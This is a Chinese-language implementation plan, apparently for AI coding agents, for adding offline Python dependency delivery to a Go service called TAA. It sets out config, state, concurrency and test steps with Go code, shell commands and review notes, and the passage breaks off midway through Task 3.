# 模型依赖下发（TAA 侧）实施计划

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** 为 TAA 增加一条依赖包下发通道：平台通过 `POST /v1/taa/importDeps` 投递离线 wheelhouse，TAA 按 SM3 内容寻址落盘到 `depsDir/<hash>`、以非 root 方式 `pip --target` 安装、走与模型同策略的 fail-closed 审计，并在后续训练子进程中注入 `TAA_DEPS_DIR` 与前置 `PYTHONPATH`。

**Architecture:** 内容寻址落盘（与既有 `dataDirForHash` 同构）+ 全局单例状态位（与 `ModelImported` 同构）+ 复用既有下载/解密/审计/上报四条能力。依赖目录放在 `ModelDir` **同级**，从而规避 `ModelDir` 被审计扫描、被折进模型 SM3、被 `cleanDirContents` 清空、被 `ExtractArchiveToDir` 整体删除这四个冲突。依赖是**可选**的：未导入时不注入任何环境变量，既有流程逐字节不变。

**Tech Stack:** Go 1.x（标准库 `net/http`、`os/exec`、`crypto` 封装 `pkg/crypto`）、`pip3`（离线 `--no-index --target` 安装）、既有 `internal/codeaudit` 审计引擎、`go test`。

**依据 spec:** `.claude/specs/2026-10-08-model-dependency-delivery-design.md`

---

## 全局约束（适用于本计划全部 Task）

**注释语言（CLAUDE.md 硬性要求）：** 本计划各 Task 的 Go 代码块中，**中文注释只用于表达意图，
不代表要落库的文本**。仓库既有代码大量使用中文行注释（`internal/` 下 129 个 Go 文件中有 61 个含中文
行注释），因此 CLAUDE.md 的「Code comments: Must use English comments only」是对**新增代码**的
前瞻性约束。判据是「**这段代码是否在本次被重写**」：

- 本次**新增或重写**的行、函数与 doc comment ⇒ 一律英文。
  已落地证据：`internal/controller/deps_state.go` 与 `deps_state_test.go` 的中文行注释数均为 0。
- 本次**原样保留的既有行**（例如 `tryAcquireTask` 的既有中文 doc comment）⇒ 不翻译、不顺手改动。
- 计划代码块中出现中文注释且属于前一类时，实现时**必须译为英文**，不要逐字照抄。
  受影响范围：Task 5/6/7/8/9 的代码块（Task 2/3 已按英文落地，其代码块中的中文为历史残留）。

派发实现者时必须重申此条；审查者也以此条为准。

---

## 与原 spec 的实现级差异与已知遗留

1. **`PYTHONPATH` 注入位置**：spec §7 写的是"在 `MergedRuntimeEnv` 合并之后前置拼接"，因此需要给
   `RunRuntimeConfigWithControl` 加参数——但那会波及 `internal/coordinator/flow_training.go:188,273`
   与 `internal/runtime/process_test.go:121,153` 共 4 处调用点。
   本计划改为在**控制器侧**调用 `parseRuntimeConfig` 之后、传入执行器之前对 `env` 做前置拼接
   （`applyDepsEnv`）。由于平台侧 `PYTHONPATH` 与 TAA 注入落在**同一个 map**，合并顺序完全一致，
   最终环境**逐字节等价**，且零签名改动。Task 8 的单测断言这一点。
2. **`tryAcquireTask` 的第三类任务**：不把第四个参数 `isModel bool` 改成 `taskType string`
   （会波及 2 处生产代码 + 9 处测试调用）。改为抽出 `tryAcquireTaskTyped`，原签名保留为薄封装。

**范围外追加（执行期由审查发现，已补入计划）**：
- **Task 1 Step 10–11**：新增 `validateDepsDirPlacement`，在启动时拒绝「`depsDir` 落在 `modelDir`
  之内」的配置。原始 spec 与计划都未包含此项——它是 Task 1 代码质量审查发现的缺口：spec §2.3 把
  「同级」当作承重前提（a/b/c/d 四类冲突全靠它规避），却不设任何防线，一次手滑即静默触发。
  属于**超出已批准 spec 的功能追加**，在此显式记录以便回溯。

**执行期事实修正（由 subagent 审查核实，供后续 Task 参考）**：
- `cleanDirContents` **定义**在 `internal/controller/import_helpers.go:75`（不是 `import_processing.go`）；
  `import_processing.go` 里的是调用点。
- `setupTestState(t)` 的既有签名是 `func setupTestState(t *testing.T) (*TAAState, string)`——
  第二个返回值是任务 ID 之类的字符串；调用处一律写作 `state, _ := setupTestState(t)`。
- 配置加载顺序（已核实）：`applyStartupConfigFile`（`config.go:214`）**先于**
  `validateStartupConfig`（`config.go:215`），因此校验看到的是文件覆盖后的值。
- `go build ./...` 在本仓库**必然失败**，原因限于 `models/audit/holdout-sources/semgrep-rules-develop/`
  下故意写坏的 Go 样例（约 40 个错误），与本特性无关，**不要去修**。构建请用
  `go build -o bin/taa ./cmd/taa` 或 `go build ./cmd/... ./internal/... ./pkg/...`。
- `internal/platform/reporter.go` 有**两套**并行的上报 API：**包级函数**（`ReportRes` /
  `ReportModelImport` / `ReportAudit` / `ReportTaskOutcome` / `ReportModelLog` / `ReportProgress`，
  `:122-280`）与 **`(*Client)` 方法**（`:282-302`，被 `internal/coordinator` 经
  `c.platformClient.*` 调用）。`internal/controller/report.go` 包装的是**包级函数**那一套。
  因此 Task 7 只需新增包级 `ReportDeps` 与 `ReportAuditScoped` 及其 controller 包装，
  **不要**补 `(*Client).ReportDeps` ——依赖导入是 controller-only 路径（Task 5/6），不经
  coordinator，补上即无人调用的死代码。（若将来把依赖流程搬进 coordinator，才需要补，届时另说。）
- Task 7 引用的行号已核实准确：常量块 `:11-16`（+`)` 至 `:17`）、`reportAuditPayload` `:46-53`、
  `ReportAudit` `:191`；文件共 304 行。`ReportDeps` 的签名与 `:152` 的 `ReportModelImport`
  逐字同构（`checksum ...map[string]any`），已确认一致。

**已知遗留（不在本计划范围）**：
- `reportRes` 的 `deps_checksum` 在 `internal/coordinator/flow_training.go:219` 这条备用执行路径上传
  `nil`——该路径没有依赖概念。理由与影响记在 Task 10。
- spec §12 的**端到端测试**（经 platform-mock 上传 wheelhouse → `importDeps` → `importModel` →
  `import` → 训练进程 `import` 到目标包）依赖 spec §11 的第 2 阶段，归入第二份计划。
- spec §5 只要求 `current_op` 新增 `deps_importing`；本计划的流水线另外用了 `decrypting`（沿用模型
  导入的既有取值）与 `deps_installing`（安装阶段），使 `status` 在长耗时的安装期间可区分于下载。
  这是对 spec 的**增量**，不改变 `deps_importing` 的语义。
  **spec §5 已同步补齐这三个取值**（2026-10-08）——否则 phase 2/3 只读 spec 的实现者会漏掉两个。
- **`go build ./...` 在本 checkout 本来就失败**（2026-10-08，Task 11 实现期发现并由我复核）：
  失败点全部在 `models/audit/holdout-sources/semgrep-rules-develop/...` 下，是 semgrep 规则夹具
  （内含故意不可编译的 Go 与缺失的第三方模块，如 `github.com/anthropics/anthropic-sdk-go`）。
  **机制（已核实，勿归因给 go.work）**：该目录**没有自己的 `go.mod`**（`find models/audit/holdout-sources
  -name go.mod` 为空），因此它属于**根模块**，`./...` 会像扫 `internal/` 一样扫到它。`go.work`
  只 `use` 了 `.`、`./teellm`、`./teellm/teetls`、`./tools/sdk`，与此无关。
  该路径**未被本分支任何提交碰过**（`git log master..HEAD -- models/audit/holdout-sources` 为空）
  且**未入库**（`git ls-files` 为空，是本地文件）。
  **因此全部任务的验证命令一律用窄范围**：`go build ./cmd/... ./internal/... ./pkg/...`，
  测试用 `go test ./internal/... ./pkg/...`；**不要用 `go build ./...` / `go test ./...`**，
  否则会把环境既有的失败误判成本次改动引入的回归。
  （CLAUDE.md 里写的 `go test ./...` 在此 checkout 上不成立，属环境问题，不在本计划范围。）

---

## 文件结构

**新建**

| 文件 | 职责 |
| :--- | :--- |
| `internal/controller/deps_state.go` | 依赖状态位的读写、持久化镜像、训练注入用目录解析 |
| `internal/controller/deps_import.go` | `depsImportRequest`、`depsImportHandler`、`processImportedDeps` 流水线 |
| `internal/controller/deps_audit.go` | 依赖包审计与 `reportAudit(scope=deps)` 上报 |
| `internal/controller/deps_env.go` | `applyDepsEnv`：前置 `PYTHONPATH` + 注入 `TAA_DEPS_DIR`（纯函数） |
| `internal/resource/deps.go` | `ValidateWheelhouse`：校验归档内 `requirements.txt` 与 `*.whl` |
| `internal/runtime/deps.go` | `InstallWheelhouse`：执行离线 `pip3 --target` |
| `internal/controller/deps_import_test.go` | handler 校验、流水线、幂等、回滚测试 |
| `internal/controller/concurrency_test.go` | 追加 `tryAcquireTaskTyped` 的三条并发测试（既有文件） |
| `internal/controller/deps_env_test.go` | 注入纯函数测试 |
| `internal/resource/deps_test.go` | wheelhouse 校验测试 |
| `internal/runtime/deps_test.go` | 安装器测试（pip 缺失时 skip） |

**修改**

| 文件 | 改动 |
| :--- | :--- |
| `internal/config/config.go:37,111-120,288,373-384` | `StartupConfig.DepsDir`、`startupStorageConfigFile.DepsDir`、默认值、覆盖逻辑 |
| `internal/controller/route.go:33-56` | `SecurityConfig.DepsDir` + `GetDepsDir()` |
| `internal/controller/route.go:123-160` | `TAAState` 新增 3 个依赖字段 |
| `internal/controller/route.go:208-248,252-297` | `RestoreFromPersistentState` / `sealStateLocked` 镜像依赖字段 |
| `internal/controller/route.go:575-...` | 抽出 `tryAcquireTaskTyped` + `isModelDataPair` |
| `internal/store/sealed_state.go:22-36` | `PersistentState` 新增 3 个依赖字段 |
| `internal/controller/router.go:9-22` | 注册 `/v1/taa/importDeps` |
| `internal/controller/import_processing.go:178` 后 | 训练前调用 `applyDepsEnv` |
| `internal/controller/import_processing.go:718` 附近 | `reportAuditAsync` 增加 scope 变体 |
| `internal/controller/import_processing.go:1006-1012` | 训练报告带上依赖 checksum |
| `internal/controller/handler_system.go:57-73` | `status` 回 `depsImported` / `depsHash` |
| `internal/controller/report.go` | `ReportDeps`、`ReportAuditScoped` 封装 |
| `internal/platform/reporter.go:11-53,191+` | `ReportDepsEndpoint`、`reportDepsPayload`、`ReportDeps`、`ReportAuditScoped`、`reportAuditPayload.Scope` |
| `internal/runtime/report.go:46,42` | `BuildTrainingReport` 增加 `depsChecksum` 参数 |
| `internal/app/taa/app.go:565-650` | `buildSecurityConfig` 透传 `DepsDir`，`ensureSecurityDirectories` 建目录 |
| `internal/controller/handler_test.go` | `setupTestState` 夹具补 `DepsDir: t.TempDir()` |
| `api/proto/taa.proto:31-59,74-81,225-232` | 补 `ImportDeps`/`ReportDeps` rpc 与消息、`ReportAuditRequest.scope`、`StatusData` 状态位 |
| `.claude/specs/...` | 不改；本计划与 spec 的差异记录在下方「与原 spec 的两处实现级差异」 |

---

## Task 1: 配置贯通 `depsDir`

**Files:**
- Modify: `internal/config/config.go:37`、`:111-120`、`:288`、`:373-384`
- Modify: `internal/controller/route.go:33-56`
- Modify: `internal/app/taa/app.go:565-650`
- Test: `internal/config/config_test.go`

- [ ] **Step 1: 写失败测试**

追加到 `internal/config/config_test.go`：

```go
func TestLoadStartupConfigDepsDirPrecedence(t *testing.T) {
	// storage.depsDir wins over the built-in default.
	dir := t.TempDir()
	path := filepath.Join(dir, "boot.json")
	if err := os.WriteFile(path, []byte(`{"storage":{"depsDir":"/tmp/custom-deps"}}`), 0o600); err != nil {
		t.Fatalf("write config: %v", err)
	}

	cfg, err := LoadStartupConfig(path)
	if err != nil {
		t.Fatalf("LoadStartupConfig: %v", err)
	}
	if cfg.DepsDir != "/tmp/custom-deps" {
		t.Fatalf("DepsDir = %q, want /tmp/custom-deps", cfg.DepsDir)
	}
}

func TestLoadStartupConfigDepsDirDefault(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "boot.json")
	if err := os.WriteFile(path, []byte(`{}`), 0o600); err != nil {
		t.Fatalf("write config: %v", err)
	}

	cfg, err := LoadStartupConfig(path)
	if err != nil {
		t.Fatalf("LoadStartupConfig: %v", err)
	}
	if cfg.DepsDir != "/opt/taa/model-deps" {
		t.Fatalf("DepsDir = %q, want /opt/taa/model-deps", cfg.DepsDir)
	}
}
```

若既有测试用的加载函数名不是 `LoadStartupConfig`，以 `internal/config/config_test.go` 中现有的
加载入口为准，不要新造入口。

- [ ] **Step 2: 运行测试确认失败**

```bash
go test ./internal/config/ -run TestLoadStartupConfigDepsDir -v
```

期望：编译失败 `cfg.DepsDir undefined`。

- [ ] **Step 3: 实现配置字段**

`internal/config/config.go` 的 `StartupConfig` 结构体中，在 `ModelDir string`（`:37`）之后新增：

```go
	DepsDir                    string
```

`startupStorageConfigFile`（`:111-120`）中，在 `ModelDir  string \`json:"modelDir"\`` 之后新增：

```go
	DepsDir   string `json:"depsDir"`
```

`UpdateDefaultConfig` 的默认值块（`:288` 的 `ModelDir: "/opt/taa/models",` 之后）新增：

```go
		DepsDir:                    "/opt/taa/model-deps",
```

覆盖逻辑：在 `:373-384` 那组 `ModelDir` 覆盖之后追加：

```go
	if trimmed := strings.TrimSpace(fileCfg.Storage.DepsDir); trimmed != "" {
		cfg.DepsDir = trimmed
	}
```

- [ ] **Step 4: 运行测试确认通过**

```bash
go test ./internal/config/ -run TestLoadStartupConfigDepsDir -v
```

期望：PASS。

- [ ] **Step 5: 让 `SecurityConfig` 暴露 deps 目录**

`internal/controller/route.go` 的 `SecurityConfig` 中，`ModelDir string` 之后新增：

```go
	DepsDir            string                 // 依赖包内容寻址根目录（缺省 /opt/taa/model-deps）
```

紧随其后（同一文件的 `const` 块 `:50-56`）新增常量：

```go
	DefaultDepsDir = "/opt/taa/model-deps"
```

并在 `GetModelCheckpointDir`（`:112-121`）之后新增 getter，风格与该文件既有 getter 完全一致：

```go
func (sec SecurityConfig) GetDepsDir() string {
	dir := DefaultDepsDir
	if strings.TrimSpace(sec.DepsDir) != "" {
		dir = sec.DepsDir
	}
	if abs, err := filepath.Abs(dir); err == nil {
		return filepath.Clean(abs)
	}
	return filepath.Clean(dir)
}
```

- [ ] **Step 6: 接线 app 层**

`internal/app/taa/app.go` 的 `buildSecurityConfig`（`:586` 起的返回结构体）中，`ModelDir: cfg.ModelDir,` 之后新增：

```go
		DepsDir:            cfg.DepsDir,
```

`ensureSecurityDirectories`（`:624`）中，用与既有目录完全相同的方式把 deps 目录纳入创建：

```go
	for _, dir := range []string{sec.ModelDir, sec.DataDir, sec.ResultDir, sec.GetDepsDir()} {
		if err := os.MkdirAll(dir, 0o755); err != nil {
			return fmt.Errorf("create security directory %s: %w", dir, err)
		}
	}
```

若 `ensureSecurityDirectories` 现有实现不是循环形式，就按其既有逐目录写法补一行 `sec.GetDepsDir()`，
不要重构该函数。

- [ ] **Step 7: 让测试夹具指向临时目录**

**这一步不能省。** `setupTestState`（`internal/controller/handler_test.go`）用一个
`SecurityConfig{...}` 字面量构造状态；新增 `DepsDir` 后它是零值 `""`，
`GetDepsDir()` 会回落到 `/opt/taa/model-deps`——测试环境不可写，Task 2 与 Task 6 的
所有依赖相关断言都会因权限失败而变成假阴性。

在 `setupTestState` 的 `SecurityConfig` 字面量中，`ModelDir:` 一行之后加：

```go
		DepsDir:            t.TempDir(),
```

`setupTestState` 若当前签名不带 `t`（例如是 `func setupTestState() (*TAAState, error)`），
把它改为接收 `*testing.T` 并同步更新调用点——这正是仓库里 `setupTestServer` 已经在用的形状。

- [ ] **Step 8: 运行全量测试**

```bash
go build ./... && go test ./internal/config/ ./internal/app/... ./internal/controller/ -count=1
```

期望：全部 PASS。

- [ ] **Step 9: 提交**

```bash
git add internal/config/config.go internal/config/config_test.go internal/controller/route.go internal/app/taa/app.go internal/controller/handler_test.go
git commit -m "feat(deps): add configurable depsDir to storage config"
```

- [ ] **Step 10: 校验 `depsDir` 不落在 `modelDir` 之内（代码质量审查追加）**

**此步骤不在原始 spec 中**，是 Task 1 代码质量审查发现的缺口。spec §2.3 把「与 `ModelDir` 同级」
当作承重前提（该节的 a/b/c/d 四类冲突全靠它规避），但 spec 与计划原本**没有任何地方校验它**。
一次可理解的手滑（`"storage":{"depsDir":"/opt/taa/models/deps"}`）就会静默触发四类冲突，
且要到下一次模型下发才暴露——属于「代价高、隐患静默」类问题，与既有的
`validateSemgrepTimeout` 同类，因此同样在启动时拒绝。

追加测试到 `internal/config/config_test.go`：

```go
func TestValidateDepsDirPlacement(t *testing.T) {
	cases := []struct {
		name     string
		modelDir string
		depsDir  string
		wantErr  bool
	}{
		{"sibling", "/opt/taa/models", "/opt/taa/model-deps", false},
		{"nested", "/opt/taa/models", "/opt/taa/models/deps", true},
		{"identical", "/opt/taa/models", "/opt/taa/models", true},
		{"nested two levels", "/opt/taa/models", "/opt/taa/models/a/b", true},
		{"deps is the parent of model", "/opt/taa/models", "/opt/taa", false},
		{"empty deps", "/opt/taa/models", "", false},
		{"empty model", "", "/opt/taa/model-deps", false},
		{"trailing separator", "/opt/taa/models/", "/opt/taa/models/deps", true},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			err := validateDepsDirPlacement(tc.modelDir, tc.depsDir)
			if tc.wantErr && err == nil {
				t.Fatalf("validateDepsDirPlacement(%q, %q) = nil, want error", tc.modelDir, tc.depsDir)
			}
			if !tc.wantErr && err != nil {
				t.Fatalf("validateDepsDirPlacement(%q, %q) = %v, want nil", tc.modelDir, tc.depsDir, err)
			}
		})
	}
}
```

实现：在 `internal/config/config.go` 中，于 `validateStartupConfig` 内已有校验之后调用，
并把辅助函数放在 `validateSemgrepTimeout` 附近：

```go
	if err := validateDepsDirPlacement(cfg.ModelDir, cfg.DepsDir); err != nil {
		return err
	}
```

```go
// validateDepsDirPlacement rejects a depsDir nested inside modelDir.
//
// The dependency design rests on these two directories being siblings: a model import
// replaces modelDir wholesale (resource.ExtractArchiveToDir does RemoveAll + rename), the
// model audit scans the whole of modelDir, and a failed audit wipes it via cleanDirContents.
// A depsDir nested inside modelDir would therefore be destroyed by the next model delivery
// and would perturb the model's content checksum in the meantime. Because that failure only
// surfaces on the next delivery, it is rejected at startup instead.
func validateDepsDirPlacement(modelDir, depsDir string) error {
	if strings.TrimSpace(modelDir) == "" || strings.TrimSpace(depsDir) == "" {
		return nil
	}
	modelAbs, err := filepath.Abs(modelDir)
	if err != nil {
		return nil // an unresolvable modelDir is reported by the directory checks
	}
	depsAbs, err := filepath.Abs(depsDir)
	if err != nil {
		return nil
	}
	rel, err := filepath.Rel(modelAbs, depsAbs)
	if err != nil {
		return nil
	}
	if rel == "." || rel != ".." && !strings.HasPrefix(rel, ".."+string(filepath.Separator)) {
		return fmt.Errorf("storage.depsDir (%s) must not be inside storage.modelDir (%s): a model import replaces that directory wholesale and would destroy the installed dependencies", depsAbs, modelAbs)
	}
	return nil
}
```

`rel` 的判定要读准：`Rel` 返回 `".."` 或 `"../x"` 表示 `depsDir` 在 `modelDir` **之外**（放行）；
返回 `"."` 表示两者相同、返回其它值表示 `depsDir` 在 `modelDir` **之内**（拒绝）。

- [ ] **Step 11: 运行测试并提交**

```bash
go test ./internal/config/ -run TestValidateDepsDirPlacement -v
go build -o bin/taa ./cmd/taa && go test ./internal/config/ ./internal/app/... ./internal/controller/ -count=1
```

```bash
git add internal/config/config.go internal/config/config_test.go
git commit -m "fix(config): reject a depsDir nested inside modelDir"
```

---

## Task 2: 依赖状态位与持久化

**Files:**
- Create: `internal/controller/deps_state.go`
- Modify: `internal/controller/route.go:123-160`、`:208-248`、`:252-297`
- Modify: `internal/store/sealed_state.go:22-36`
- Test: `internal/controller/deps_state_test.go`

- [ ] **Step 1: 写失败测试**

创建 `internal/controller/deps_state_test.go`：

```go
package controller

import (
	"testing"

	"taa/internal/store"
)

func TestSaveDepsSuccessPersistsHashAndChecksum(t *testing.T) {
	state, _ := setupTestState(t)

	checksum := map[string]any{"size": int64(1234), "algorithm": "sm3", "value": "abc"}
	state.saveDepsSuccess("abc", checksum)

	if !state.DepsImported {
		t.Fatal("DepsImported = false, want true")
	}
	if state.DepsHash != "abc" {
		t.Fatalf("DepsHash = %q, want abc", state.DepsHash)
	}
	if got := state.getDepsChecksum(); got["value"] != "abc" {
		t.Fatalf("checksum value = %v, want abc", got["value"])
	}
	if got := state.currentDepsDir(); got == "" {
		t.Fatal("currentDepsDir returned empty while deps imported")
	}
}

func TestClearDepsStateResetsEverything(t *testing.T) {
	state, _ := setupTestState(t)
	state.saveDepsSuccess("abc", map[string]any{"size": int64(1), "algorithm": "sm3", "value": "abc"})

	state.clearDepsState()

	if state.DepsImported {
		t.Fatal("DepsImported = true after clear")
	}
	if state.DepsHash != "" {
		t.Fatalf("DepsHash = %q after clear, want empty", state.DepsHash)
	}
	if got := state.currentDepsDir(); got != "" {
		t.Fatalf("currentDepsDir = %q after clear, want empty", got)
	}
}

func TestRestoreFromPersistentStateCarriesDeps(t *testing.T) {
	state, _ := setupTestState(t)

	state.RestoreFromPersistentState(&store.PersistentState{
		CurrentPhase: 1,
		DepsImported: true,
		DepsHash:     "deadbeef",
		DepsChecksum: map[string]any{"size": int64(9), "algorithm": "sm3", "value": "deadbeef"},
	})

	if !state.DepsImported || state.DepsHash != "deadbeef" {
		t.Fatalf("restore lost deps state: imported=%v hash=%q", state.DepsImported, state.DepsHash)
	}
	if got := state.getDepsChecksum(); got["value"] != "deadbeef" {
		t.Fatalf("restored checksum = %v, want deadbeef", got["value"])
	}
}
```

- [ ] **Step 2: 运行测试确认失败**

```bash
go test ./internal/controller/ -run 'TestSaveDepsSuccess|TestClearDepsState|TestRestoreFromPersistentStateCarriesDeps' -v
```

期望：编译失败 `state.saveDepsSuccess undefined`。

- [ ] **Step 3: 加状态字段**

`internal/controller/route.go` 的 `TAAState` 中，`ModelChecksum` 与 `DataChecksum`（`:145-146`）之后新增：

```go
	DepsImported          bool                     // 依赖包已安装且通过审计
	DepsHash              string                   // 当前生效依赖包的 SM3 内容寻址键
	DepsChecksum          map[string]any           // 依赖包校验和 (size, algorithm, value)
```

`internal/store/sealed_state.go` 的 `PersistentState` 中，`DataChecksum`（`:33`）之后新增：

```go
	DepsImported          bool                `json:"depsImported"`          // 依赖包已安装且通过审计
	DepsHash              string              `json:"depsHash"`              // 当前生效依赖包的 SM3
	DepsChecksum          map[string]any      `json:"depsChecksum"`
```

- [ ] **Step 4: 实现状态读写**

创建 `internal/controller/deps_state.go`：

```go
package controller

import "path/filepath"

// saveDepsSuccess 记录依赖包导入成功：置位状态、记录内容寻址 hash 与校验和，并同步密封落盘。
func (s *TAAState) saveDepsSuccess(hash string, checksum map[string]any) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.DepsImported = true
	s.DepsHash = hash
	s.DepsChecksum = checksum
	if err := s.sealStateLocked(); err != nil {
		s.Logs.Add(LogError, "state", "持久化依赖导入成功状态失败: %v", err)
	}
}

// clearDepsState 回滚依赖状态（导入失败、审计未通过时调用）。
func (s *TAAState) clearDepsState() {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.DepsImported = false
	s.DepsHash = ""
	s.DepsChecksum = nil
	if err := s.sealStateLocked(); err != nil {
		s.Logs.Add(LogError, "state", "持久化依赖状态回滚失败: %v", err)
	}
}

// getDepsChecksum 返回依赖包校验和快照，避免调用方持有内部 map。
func (s *TAAState) getDepsChecksum() map[string]any {
	s.mu.RLock()
	defer s.mu.RUnlock()
	if s.DepsChecksum == nil {
		return nil
	}
	out := make(map[string]any, len(s.DepsChecksum))
	for k, v := range s.DepsChecksum {
		out[k] = v
	}
	return out
}

// currentDepsDir 返回当前生效的依赖安装目录；未导入依赖时返回空串。
// 空串是"不注入任何环境变量"的信号，因此这里必须是唯一的判据。
func (s *TAAState) currentDepsDir() string {
	s.mu.RLock()
	defer s.mu.RUnlock()
	if !s.DepsImported || strings.TrimSpace(s.DepsHash) == "" {
		return ""
	}
	return filepath.Join(s.Security.GetDepsDir(), s.DepsHash)
}

// depsDirForHash 返回任意 hash 对应的内容寻址目录（含未生效的历史版本，供审计与清理使用）。
func (s *TAAState) depsDirForHash(hash string) string {
	return filepath.Join(s.Security.GetDepsDir(), hash)
}
```

在 `deps_state.go` 的 import 块补上 `"strings"`。

- [ ] **Step 5: 持久化镜像**

`internal/controller/route.go` 的 `sealStateLocked` 中，`DataChecksum` 落盘块（`:280-287`）之后新增：

```go
	state.DepsImported = s.DepsImported
	state.DepsHash = s.DepsHash
	if s.DepsChecksum != nil {
		state.DepsChecksum = make(map[string]any, len(s.DepsChecksum))
		for k, v := range s.DepsChecksum {
			state.DepsChecksum[k] = v
		}
	} else {
		state.DepsChecksum = nil
	}
```

`RestoreFromPersistentState` 中，`DataChecksum` 还原块（`:230-235`）之后新增：

```go
	s.DepsImported = p.DepsImported
	s.DepsHash = p.DepsHash
	if p.DepsChecksum != nil {
		s.DepsChecksum = make(map[string]any, len(p.DepsChecksum))
		for k, v := range p.DepsChecksum {
			s.DepsChecksum[k] = v
		}
	} else {
		s.DepsChecksum = nil
	}
```

- [ ] **Step 6: 运行测试确认通过**

```bash
go test ./internal/controller/ -run 'TestSaveDepsSuccess|TestClearDepsState|TestRestoreFromPersistentStateCarriesDeps' -v
```

期望：PASS。

若 `TestRestoreFromPersistentStateCarriesDeps` 因既有 `RestoreFromPersistentState` 对 `ActiveTask == nil`
把 `CurrentOp` 置为 `idle` 而失败，那是既有行为，测试不应断言 `CurrentOp`。

- [ ] **Step 7: 提交**

```bash
git add internal/controller/deps_state.go internal/controller/deps_state_test.go internal/controller/route.go internal/store/sealed_state.go
git commit -m "feat(deps): persist dependency import state"
```

---

### Task 2 审查追加（编码后按审查结论补充）

计划原本只列了 3 条测试。代码质量审查发现**唯一谓词的第二半分支零覆盖**：全部测试的
`DepsHash` 取值非空白，从未构造 `DepsImported == true && TrimSpace(DepsHash) == ""`。若日后
有人把谓词化简为 `s.DepsHash != ""`，**全套测试仍然通过**，而空白 hash 会被当作有效值——
训练子进程会拿到 `TAA_DEPS_DIR=<depsDir>/   ` 与前置的垃圾 `PYTHONPATH`，Python 静默忽略不
存在的路径，训练可能"看起来装了依赖"实则跑在系统包上。补 `TestCurrentDepsDirRejectsBlankHash`，
并做变异校验（删掉 `TrimSpace` 半句后该测试必须转红，否则等于没测）。

另有两条一并修正：`TestClearDepsStateResetsEverything` 漏断言 `DepsChecksum`（恰好是
`clearDepsState` 唯一未被覆盖的字段，删掉那行测试照样过）；`depsDirForHash` 的注释把用途写成
"auditing and cleanup"，与它在 Task 6 的实际用途（安装目标目录 + 失败路径 `RemoveAll`）不符。

审查**明确否决**的两项改动，记录在此以免后续重复提出：

- 为 `saveDepsSuccess` 加防御性 map 拷贝——会使 Deps 与既有的 Model/Data 赋值约定不一致，
  且别名暴露是**既有代码库级模式**（同样的暴露存在于 `setModelChecksum`、`setDataChecksum`，
  以及 `internal/coordinator/phase_state.go`）。仅补文档写明所有权契约，不改行为。
- 提取共享 map-clone helper 消除 6 处同形拷贝块——须连带改动既有的 ModelChecksum/DataChecksum
  站点才能避免混搭风格，属本分支一贯回滚的无关 churn；待出现第 4 个字段时另开提交。

审查同时确认了 `sealStateLocked` 的拷贝是**必要的而非形式主义**：`SealState` 会把 `&state`
存进 store 的缓存，不拷贝则 `state.DepsChecksum` 与 `s.DepsChecksum` 别名共享，之后任何一次
in-place 写入都会污染 store 的缓存态。

---

## Task 3: `tryAcquireTaskTyped` 与任务类型扩展

**Files:**
- Modify: `internal/controller/route.go:575-642`
- Test: `internal/controller/concurrency_test.go`（该文件已是 `tryAcquireTask` 相关测试的归属地）

- [ ] **Step 1: 写失败测试**

**追加到既有的 `internal/controller/concurrency_test.go`**，不要新建文件——该文件已经放着
`tryAcquireTask` 的并发测试，本任务测的是同一个函数的类型化重写，理应同处：

```go
func TestTryAcquireDepsTaskRejectedWhileAuditing(t *testing.T) {
	state, _ := setupTestState(t)

	state.mu.Lock()
	state.AuditRunning = true
	state.mu.Unlock()

	if _, err := state.tryAcquireTaskTyped("task-deps-1", "req-deps-1", "deps_importing", "deps_import"); err == nil {
		t.Fatal("expected deps import to be rejected while a model audit is running")
	}
}

func TestTryAcquireDepsTaskBlocksModelImport(t *testing.T) {
	state, _ := setupTestState(t)

	release, err := state.tryAcquireTaskTyped("task-deps-2", "req-deps-2", "deps_importing", "deps_import")
	if err != nil {
		t.Fatalf("deps acquire failed: %v", err)
	}
	defer release()

	if _, err := state.tryAcquireTask("task-model-2", "req-model-2", "downloading", true); err == nil {
		t.Fatal("expected model import to be rejected while a deps import is in flight")
	}
}

func TestDepsImportStillAllowsDataImportPairingRules(t *testing.T) {
	state, _ := setupTestState(t)

	// Data import stays decoupled from audits, exactly as before this change.
	state.mu.Lock()
	state.AuditRunning = true
	state.mu.Unlock()

	release, err := state.tryAcquireTaskTyped("task-data-9", "req-data-9", "downloading", "data_import")
	if err != nil {
		t.Fatalf("data import should not be blocked by an audit: %v", err)
	}
	release()
}
```

不需要新增 import：`concurrency_test.go` 已有它所需的包。**不要**为未使用的包写
`var _ = pkg.Something` 之类的占位——那是本计划明令禁止的写法。

- [ ] **Step 2: 运行测试确认失败**

```bash
go test ./internal/controller/ -run 'TestTryAcquireDepsTask|TestDepsImportStillAllowsDataImportPairingRules' -v
```

期望：编译失败 `tryAcquireTaskTyped undefined`。

- [ ] **Step 3: 抽出 typed 实现并保留原签名**

把 `internal/controller/route.go` 的 `tryAcquireTask`（`:572-642` 起，直到该函数结束）改为：

```go
// tryAcquireTask 尝试原子抢占训练/导入任务执行权（单任务互斥）。
// isModel: true 表示模型导入流程，false 表示数据导入/训练流程
// initialOp: 初始操作标识（如 "downloading" 或 "staging"）
func (s *TAAState) tryAcquireTask(taskID, requestID, initialOp string, isModel bool) (func(), error) {
	taskType := "data_import"
	if isModel {
		taskType = "model_import"
	}
	return s.tryAcquireTaskTyped(taskID, requestID, initialOp, taskType)
}

// isModelDataPair reports whether an in-flight task type and a requested task type form the
// single pairing the pipeline allows: a model import and a data import sharing one taskID.
// Dependency imports pair with nothing — they hold the audit slot, and the audit is exclusive.
func isModelDataPair(current, requested string) bool {
	return (current == "model_import" && requested == "data_import") ||
		(current == "data_import" && requested == "model_import")
}

// tryAcquireTaskTyped is the typed implementation behind tryAcquireTask.
// taskType is one of model_import / data_import / deps_import. An initialOp of
// "staging" or "training" is always promoted to a training task.
func (s *TAAState) tryAcquireTaskTyped(taskID, requestID, initialOp, taskType string) (func(), error) {
	s.mu.Lock()
	defer s.mu.Unlock()

	// 1. While training is executing, refuse every new task unconditionally.
	if s.isTrainingBusyLocked() {
		task, op := s.activeTaskInfoLocked()
